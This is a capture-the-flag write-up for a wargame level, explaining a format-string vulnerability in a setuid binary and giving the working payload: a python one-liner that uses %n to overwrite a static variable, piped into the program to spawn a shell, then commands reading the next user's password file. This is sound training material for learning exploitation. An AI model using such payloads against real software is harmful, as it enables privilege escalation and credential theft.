# Level3

## Context & Explanation
 * There is one file in our home, ```level3```, belonging to ```level4``` user, with suid.
 * Here's the hand-decompiled source code we propose for this binary: [source.c](source.c)

 * We run the program with gdb and we observe that:
 	* `main()` only calls `v()`
	* `v()` makes use of `fgets()` with an on stack array of size `0x200`
	* It then calls printf with our input as the format string
	* If we get the `static int m` to equal `0x40` the function will call `system("/bin/sh")` and allow us to get the flag.

 * We have the appropriate setup for a [Format-String attack](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf), because printf makes use of a buffer user filled:
    * We want to modify the value of `static int m` to equal `0x40`. It's address is `0x804988c`
		* printf modifier `%n` consider argument as `int*` and write there the number of character written until this modifier, so it needs to be `0x40`
		* we now have to write and access this pointer to `static int m`.
	* When `printf()` is called here is the stack layout:
		1. ESP + 00 [4 octets:		printf format string pointer]
		2. ESP + 04 [4 octets:		data from previous actions  ]
		3. ESP + 08 [4 octets:		data from previous actions  ]
		4. ESP + 12 [4 octets:		data from previous actions  ]
		5. ESP + 16 [0x200 octets:	begining of format buffer   ]

	* So our format should look this way:
		* [m address][%08x]*3[filler text to write in total `0x40` octets][%n]
			* [m address] needs to be written in reverse to fit endianness
			* Each of the [%08x] allows us to access the next stack argument.
			* we can make use of the width modifier argument to easily get to `0x40` written octets.
		* This would be our format string, with `[]` delimiting each part: `[\x8c\x98\x04\x08][%08x%08x%044x][%n]`

## Resolution

	1. We generate our future format string using this command:
```sh
python -c "print('\x8c' + '\x98' + '\x04' + '\x08' + '%08x%08x%044x%n')" > /var/crash/injection_lvl3
```
	2. We launch `level3` by making use of cat with our custom file, with `-` as a second argument, so once the file has been read, cat will transmit stdin :
```sh
cat /var/crash/injection_lvl3  - | ./level3
```
	3. Inside the newly opened shell session we now only have execute these commands:
```sh
cd ..
cd level4
cat .pass
```
